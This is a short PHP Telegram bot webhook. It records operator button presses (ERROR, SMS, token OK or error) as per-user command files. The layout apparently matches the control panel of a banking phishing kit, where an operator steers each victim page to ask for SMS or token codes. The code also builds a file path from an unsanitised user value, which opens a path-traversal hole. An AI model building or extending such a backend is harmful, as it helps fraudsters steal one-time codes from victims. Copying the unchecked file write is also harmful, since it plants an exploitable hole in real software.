<?php
include("settings.php");

$secret_header = $_SERVER['HTTP_X_TELEGRAM_BOT_API_SECRET_TOKEN'] ?? '';
if ($secret_header !== $webhook_secret) {
    http_response_code(403);
    exit('Forbidden');
}

$update = json_decode(file_get_contents('php://input'), true);

if (isset($update['callback_query'])) {
    $cb      = $update['callback_query'];
    $cb_id   = $cb['id'];
    $data    = $cb['data'];
    $parts   = explode('|', $data, 2);
    $action  = $parts[0] ?? '';
    $usuario = $parts[1] ?? '';

    if (!file_exists('acciones')) mkdir('acciones', 0755, true);

    $map = [
        'ERROR'  => '/ERROR',
        'SMS'    => '/SMS',
        'TOKOK'  => '/LISTO',
        'TOKERR' => '/COMPRA',
    ];
    file_put_contents("acciones/$usuario.txt", $map[$action] ?? '/ERROR');

    file_get_contents("https://api.telegram.org/bot{$token}/answerCallbackQuery?" . http_build_query([
        'callback_query_id' => $cb_id,
        'text'              => "✅ $action → $usuario",
        'show_alert'        => false,
    ]));
}

http_response_code(200);
echo 'OK';
